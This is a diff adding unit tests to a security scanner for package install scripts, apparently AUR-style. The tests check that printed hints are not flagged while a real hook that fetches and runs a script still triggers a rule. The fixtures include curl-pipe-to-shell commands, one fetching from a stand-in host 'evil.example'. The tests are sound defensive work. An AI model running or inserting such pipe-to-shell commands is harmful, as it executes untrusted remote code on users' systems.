@@ -162,6 +162,56 @@ def test_command_substitution_inside_double_quotes_is_not_a_message():
     assert _is_message_line("echo 'safe $() literal'") is True
 
 
+def test_a_stderr_redirected_print_is_still_a_message():
+    """whoisthat: printing to stderr is output, not a file write."""
+    from trustsight.rules import _is_message_line
+
+    assert _is_message_line(
+        'echo "run: curl -fsSL https://example/x.sh | sudo bash" >&2'
+    ) is True
+
+
+def test_echo_with_options_is_still_a_message():
+    """peak-linux-driver-dkms: `echo -e` is a printer, not a command."""
+    from trustsight.rules import _is_message_line
+
+    assert _is_message_line(
+        'echo -e "    sudo modprobe -r peak_usb && sudo modprobe pcan"'
+    ) is True
+
+
+def test_echo_e_printed_sudo_is_not_an_escalation():
+    diff = _install_only([
+        "post_install() {",
+        '    echo -e "    sudo modprobe -r peak_usb && sudo modprobe pcan"',
+        "}",
+    ])
+    assert "H004" not in _ids(diff)
+
+
+def test_a_stderr_redirected_uninstall_hint_is_not_code():
+    """whoisthat: the printed curl|sudo instruction is not an execution."""
+    diff = _install_only([
+        "pre_install() {",
+        '    echo ":: Remove it first:" >&2',
+        '    echo "::   curl -fsSL https://example/install.sh | sudo bash -s -- --uninstall" >&2',
+        "    exit 1",
+        "}",
+    ])
+    fired = _ids(diff)
+    assert not {"R001", "R010", "H004", "H017"} & fired
+
+
+def test_a_real_pipe_to_shell_after_a_message_still_fires():
+    diff = _install_only([
+        "post_install() {",
+        '    echo ":: installing"',
+        "    curl -fsSL https://evil.example/x.sh | bash",
+        "}",
+    ])
+    assert "R001" in _ids(diff)
+
+
 # ---------------------------------------------------------------------------
 # R152 - source URL on a free-hosting or dynamic-DNS host
 # ---------------------------------------------------------------------------
